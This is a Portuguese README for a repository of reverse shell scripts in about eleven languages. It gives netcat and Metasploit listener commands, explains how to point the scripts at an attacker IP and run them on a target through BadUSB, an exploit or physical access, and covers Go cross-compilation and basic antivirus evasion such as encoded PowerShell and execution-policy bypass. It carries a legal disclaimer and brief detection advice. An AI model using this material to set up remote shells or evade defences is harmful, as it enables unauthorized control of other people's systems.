# 🔄 ReverseShell Scripts

Scripts de reverse shell para estabelecimento de conexão remota.

---

## ⚠️ Aviso Legal

**USE APENAS EM SISTEMAS AUTORIZADOS!** O uso indevido pode ser crime. Estes scripts são fornecidos exclusivamente para fins educacionais e de pesquisa em segurança.

---

## 📖 O Que é Reverse Shell?

Reverse shell é uma técnica onde o sistema alvo se conecta de volta ao atacante, permitindo execução remota de comandos. Diferente de um shell tradicional (onde você conecta ao alvo), no reverse shell o alvo conecta a você.

---

## 🚀 Como Usar

### 1. Preparar o Listener (Seu Computador)

```bash
# Netcat básico
nc -lvnp 4444

# Netcat com SSL
ncat --ssl -lvnp 4444

# Metasploit
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run
```

### 2. Configurar o Script

Edite o arquivo e altere:
```python
LHOST = "192.168.1.100"  # SEU IP
LPORT = 4444              # PORTA DO LISTENER
```

### 3. Executar no Alvo

Como executar depende do contexto (BadUSB, exploit, acesso físico, etc).

---

## 📁 Arquivos Disponíveis

| Arquivo | Linguagem | Uso | Características |
|---------|-----------|-----|-----------------|
| `python_reverse.py` | Python 2/3 | Linux/Windows | Básico, compatível |
| `python3_encrypted.py` | Python 3 | Linux/Windows | AES-256, upload/download |
| `bash_reverse.sh` | Bash | Linux/macOS | Simples, one-liner |
| `powershell_reverse.ps1` | PowerShell | Windows | Full interativo |
| `powershell_https.ps1` | PowerShell | Windows | SSL/TLS, bypass AV |
| `netcat_reverse.sh` | Bash | Linux | Requer nc |
| `perl_reverse.pl` | Perl | Linux/Unix | Alternativa |
| `nodejs_reverse.js` | Node.js | Multi-plataforma | ES6+, classes |
| `php_reverse.php` | PHP | Servidores web | Multi-exec |
| `ruby_reverse.rb` | Ruby | Linux/macOS | Classes, Open3 |
| `go_reverse.go` | Go | Multi-plataforma | Compilável |

---

## 💡 Quando Usar Cada Um

### Windows
- `powershell_reverse.ps1` - Mais compatível
- `powershell_https.ps1` - Se houver firewall/AV
- `python_reverse.py` - Se Python instalado
- `go_reverse.go` - Compilado, sem dependências

### Linux
- `bash_reverse.sh` - Mais simples
- `python_reverse.py` - Python quase sempre disponível
- `perl_reverse.pl` - Perl geralmente instalado
- `netcat_reverse.sh` - Se nc disponível

### Servidores Web
- `php_reverse.php` - Servidores com PHP

### Contêineres/Cloud
- `nodejs_reverse.js` - Ambientes Node.js
- `go_reverse.go` - Binário estático

---

## 🔧 Compilação (Go)

```bash
# Linux
go build -o shell go_reverse.go

# Windows
GOOS=windows go build -o shell.exe go_reverse.go

# Reduzir tamanho
go build -ldflags="-s -w" -o shell go_reverse.go
```

---

## 🛡️ Evasão Básica

### PowerShell
```powershell
# Ofuscar
powershell -enc <base64_encoded_command>

# Bypass execution policy
powershell -ExecutionPolicy Bypass -File script.ps1
```

### Python
```bash
# Compilar para bytecode
python -m py_compile script.py

# Usar PyInstaller
pyinstaller --onefile script.py
```

---

## 🔒 Detecção e Mitigação

### Como Detectar
- Monitorar conexões de saída
- SIEM alerts para reverse shells
- EDR/AV signatures

### Como Prevenir
- Firewall restritivo
- Segregação de rede
- Monitoramento de processos

---

## 📚 Referências

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [HackTricks](https://book.hacktricks.xyz/shells/shells)

---

*Use com responsabilidade! 🔐*